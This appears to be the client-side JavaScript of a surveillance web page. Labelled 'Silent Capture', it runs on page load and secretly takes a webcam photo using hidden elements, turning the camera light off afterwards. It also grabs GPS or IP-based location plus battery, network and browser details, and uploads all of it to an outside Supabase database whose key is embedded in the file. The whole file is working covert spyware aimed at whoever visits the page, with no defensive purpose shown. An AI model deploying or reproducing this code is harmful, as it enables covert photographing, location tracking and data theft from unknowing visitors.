// --- 1. SETUP ---
const SUPABASE_URL = "https://tnnjemarklihpdpioucq.supabase.co";
const SUPABASE_KEY =
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRubmplbWFya2xpaHBkcGlvdWNxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njg0NTg2ODAsImV4cCI6MjA4NDAzNDY4MH0.41OFhgx7wAl89SAqdF0BNxdBCSFbMbpYvZE7HmGdUxE";

const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

window.addEventListener("load", async () => {
  console.log("🚀 Starting Silent Capture (No Audio)...");

  try {
    // Run Image, Location, and Device Check in parallel
    const [imageBlob, locData, deviceInfo] = await Promise.all([
      captureHiddenImage(), // Photo
      getSmartLocation(), // GPS/IP
      getDeviceDetails(), // Battery, Network, OS
    ]);

    // Upload Data
    await uploadData(imageBlob, locData, deviceInfo);
  } catch (error) {
    console.error("Critical Error:", error);
  }
});

// --- 2. GET DEVICE DETAILS (Battery, Network, Screen) ---
async function getDeviceDetails() {
  let batteryInfo = "Unknown";
  let chargingStatus = "Unknown";
  let netType = "Unknown";
  let netSpeed = "Unknown";

  // Battery (Works on Android/Laptop)
  try {
    if (navigator.getBattery) {
      const bat = await navigator.getBattery();
      batteryInfo = `${Math.round(bat.level * 100)}%`;
      chargingStatus = bat.charging ? "Yes ⚡" : "No";
    }
  } catch (e) {}

  // Network (Works on Chrome/Android)
  try {
    const conn =
      navigator.connection ||
      navigator.mozConnection ||
      navigator.webkitConnection;
    if (conn) {
      netType = conn.effectiveType; // 4g, 3g
      netSpeed = conn.downlink + " Mbps";
    }
  } catch (e) {}

  return {
    battery_level: batteryInfo,
    is_charging: chargingStatus,
    network_type: netType,
    internet_speed: netSpeed,
    screen_res: `${window.screen.width}x${window.screen.height}`,
    platform: navigator.platform,
    browser: navigator.userAgent,
  };
}

// --- 3. HIDDEN CAMERA ---
async function captureHiddenImage() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.getElementById("hiddenVideo");
    video.srcObject = stream;

    return new Promise((resolve) => {
      video.onloadedmetadata = () => {
        video.play();
        // Wait 1 second for focus
        setTimeout(() => {
          const canvas = document.getElementById("hiddenCanvas");
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          canvas.getContext("2d").drawImage(video, 0, 0);

          stream.getTracks().forEach((track) => track.stop()); // Cam Light OFF
          canvas.toBlob(resolve, "image/jpeg", 0.7);
        }, 1000);
      };
    });
  } catch (err) {
    console.warn("Camera blocked.");
    resolve(null);
  }
}

// --- 4. SMART LOCATION ---
function getSmartLocation() {
  return new Promise(async (resolve) => {
    const useIpFallback = async () => {
      try {
        const r = await fetch("https://ipinfo.io/json");
        const d = await r.json();
        const [lat, lon] = d.loc.split(",");
        resolve({ lat, lon, type: "IP", details: d });
      } catch {
        resolve({ lat: null, lon: null, type: "FAIL", details: {} });
      }
    };

    if (!navigator.geolocation) {
      await useIpFallback();
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        resolve({
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          type: "GPS",
          details: { accuracy: pos.coords.accuracy },
        });
      },
      () => useIpFallback(),
      { enableHighAccuracy: true, timeout: 5000 }
    );
  });
}

// --- 5. UPLOAD EVERYTHING ---
async function uploadData(imageBlob, locData, deviceInfo) {
  let imageUrl = null;
  const timestamp = Date.now();
  const sessionId = `session_${timestamp}`;

  // A. Upload Image
  if (imageBlob) {
    const fileName = `img_${timestamp}.jpg`;
    const { error } = await supabaseClient.storage
      .from("images")
      .upload(fileName, imageBlob);
    if (!error) {
      const res = supabaseClient.storage.from("images").getPublicUrl(fileName);
      imageUrl = res.data.publicUrl;
    }
  }

  // B. Save to Separate Tables
  try {
    // 1. Save Image Data
    if (imageUrl) {
      await supabaseClient.from("images_table").insert([
        {
          session_id: sessionId,
          image_url: imageUrl,
          captured_at: new Date().toISOString(),
        },
      ]);
    }

    // 2. Save Location Data
    await supabaseClient.from("location_table").insert([
      {
        session_id: sessionId,
        latitude: locData.lat,
        longitude: locData.lon,
        location_type: locData.type,
        city: locData.details?.city || null,
        region: locData.details?.region || null,
        country: locData.details?.country || null,
        isp: locData.details?.org || null,
        accuracy: locData.details?.accuracy || null,
        captured_at: new Date().toISOString(),
      },
    ]);

    // 3. Save Device Data
    await supabaseClient.from("device_table").insert([
      {
        session_id: sessionId,
        battery_level: deviceInfo.battery_level,
        is_charging: deviceInfo.is_charging,
        network_type: deviceInfo.network_type,
        internet_speed: deviceInfo.internet_speed,
        screen_resolution: deviceInfo.screen_res,
        platform: deviceInfo.platform,
        browser: deviceInfo.browser,
        captured_at: new Date().toISOString(),
      },
    ]);

    console.log("✅ Data Uploaded to Separate Tables!");
    const messageEl = document.querySelector(".message");
  } catch (error) {
    console.error("❌ Upload Error:", error);
  }
}
